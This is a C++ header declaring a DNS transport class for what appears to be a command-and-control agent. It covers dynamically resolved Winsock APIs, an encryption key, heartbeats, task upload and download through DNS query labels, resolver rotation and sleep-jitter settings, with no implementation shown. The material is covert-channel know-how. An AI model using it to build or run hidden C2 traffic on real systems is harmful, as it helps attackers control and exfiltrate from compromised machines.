#pragma once

#include "AgentConfig.h"
#include <windows.h>

#define DECL_API(x) decltype(x) * x

// DNS function pointers structure
struct DNSFUNC {
    DECL_API(LocalAlloc);
    DECL_API(LocalReAlloc);
    DECL_API(LocalFree);
    DECL_API(WSAStartup);
    DECL_API(WSACleanup);
    DECL_API(socket);
    DECL_API(closesocket);
    DECL_API(sendto);
    DECL_API(recvfrom);
    DECL_API(select);
    DECL_API(gethostbyname);
    DECL_API(Sleep);
    DECL_API(GetTickCount);
};

// DNS protocol metadata header
#pragma pack(push, 1)
typedef struct _DNS_META_V1 {
    BYTE   version;
    BYTE   metaFlags;
    USHORT reserved;
    ULONG  downAckOffset;
} DNS_META_V1, * PDNS_META_V1;
#pragma pack(pop)

class ConnectorDNS
{
public:
    // Constants
    static const ULONG kMaxUploadSize    = 4 << 20;  // 4 MB
    static const ULONG kMaxDownloadSize  = 4 << 20;  // 4 MB
    static const ULONG kDefaultPktSize   = 1024;
    static const ULONG kMaxPktSize       = 64000;
    static const ULONG kMaxSafeFrame     = 60;
    static const ULONG kDefaultLabelSize = 48;
    static const ULONG kMaxLabelSize     = 63;
    static const ULONG kMetaSize         = sizeof(DNS_META_V1);
    static const ULONG kHeaderSize       = kMetaSize + 8;  // meta + total + offset
    static const ULONG kFrameHeaderSize  = 9;  // flags:1 + nonce:4 + origLen:4
    static const ULONG kAckDataSize      = 12;
    static const ULONG kReqDataSize      = 8;
    static const ULONG kDnsSignalBits    = 0x1;
    static const ULONG kMaxResolvers     = 16;
    static const ULONG kMaxFailCount     = 2;
    static const ULONG kQueryTimeout     = 3;  // seconds
    static const ULONG kMaxRetries       = 3;

private:
    ProfileDNS profile = { 0 };

    CHAR  rawResolvers[512] = { 0 };
    CHAR* resolverList[kMaxResolvers] = { 0 };
    ULONG resolverCount = 0;
    ULONG currentResolverIndex = 0;
    ULONG resolverFailCount[kMaxResolvers] = { 0 };
    ULONG resolverDisabledUntil[kMaxResolvers] = { 0 };

    CHAR  sid[17]        = { 0 };
    BYTE  encryptKey[16] = { 0 };
    ULONG pktSize        = 0;
    ULONG labelSize      = 0;
    CHAR  domain[256]    = { 0 };
    CHAR  qtype[8]       = { 0 };
    BOOL  initialized    = FALSE;
    BOOL  hiSent         = FALSE;
    BYTE* hiBeat         = NULL;
    ULONG hiBeatSize     = 0;
    ULONG hiRetries      = kMaxRetries;
    ULONG seq            = 0;
    ULONG idx            = 0;

    BYTE* recvData = NULL;
    int   recvSize = 0;

    BYTE* downBuf       = NULL;
    ULONG downTotal     = 0;
    ULONG downFilled    = 0;
    ULONG downAckOffset = 0;
    ULONG downTaskNonce = 0;

    BOOL  compressEnabled = TRUE;
    ULONG lastDownTotal   = 0;
    ULONG lastUpTotal     = 0;

    BOOL  lastQueryOk = FALSE;

    ULONG sleepDelaySeconds = 0;

    BOOL  hasPendingTasks = FALSE;
    BOOL  forcePoll = FALSE;

    // Upload fragment tracking for reliability
    static const ULONG kMaxTrackedOffsets = 256;
    ULONG confirmedOffsets[kMaxTrackedOffsets] = { 0 };
    ULONG confirmedCount      = 0;
    ULONG lastAckNextExpected = 0;
    BOOL  uploadNeedsReset    = FALSE;
    ULONG uploadStartTime     = 0;

    DNSFUNC* functions = NULL;

    // Private helper methods
    void  MetaV1Init(DNS_META_V1* h);
    ULONG BuildWireSeq(ULONG logicalSeq, ULONG signalBits);
    BOOL  QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    void  ParseResolvers(const CHAR* resolvers);
    void  BuildAckData(BYTE* ackData, ULONG ackOffset, ULONG nonce, ULONG taskNonce);
    void  SendHeartbeat();
    void  SendAck();
    void  HandleUpload(BYTE* data, ULONG data_size);
    void  HandleDownload();
    BOOL  ProcessDownloadChunk(BYTE* binBuf, int binLen);
    void  FinalizeDownload();
    void  ResetDownload();

    // Upload reliability helpers
    BOOL  ParsePutAckResponse(BYTE* response, ULONG respLen, ULONG* outNextExpected, BOOL* outComplete, BOOL* outNeedsReset);
    BOOL  IsOffsetConfirmed(ULONG offset);
    void  MarkOffsetConfirmed(ULONG offset);
    void  ResetUploadState();

public:
    ConnectorDNS();
    ~ConnectorDNS();

    BOOL SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds);
    void CloseConnector();

    void  SendData(BYTE* data, ULONG data_size);
    BYTE* RecvData();
    int   RecvSize();
    void  RecvClear();

    ULONG GetLastUpTotal() const { return lastUpTotal; }
    ULONG GetLastDownTotal() const { return lastDownTotal; }
    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }

    BOOL  WasLastQueryOk() const { return lastQueryOk; }

    const BYTE* GetResolvers() const { return profile.resolvers; }
    void        UpdateResolvers(BYTE* resolvers);

    void  UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct);
    void  GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct);
    void  UpdateSleepDelay(ULONG sleepSeconds);

    BOOL  IsBusy() const;
    ULONG GetDownAckOffset() const { return downAckOffset; }

    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);

    void  ForcePollOnce() { this->forcePoll = TRUE; }
    BOOL  IsForcePollPending() const { return this->forcePoll; }

    static void* operator new(size_t sz);
    static void operator delete(void* p) noexcept;
};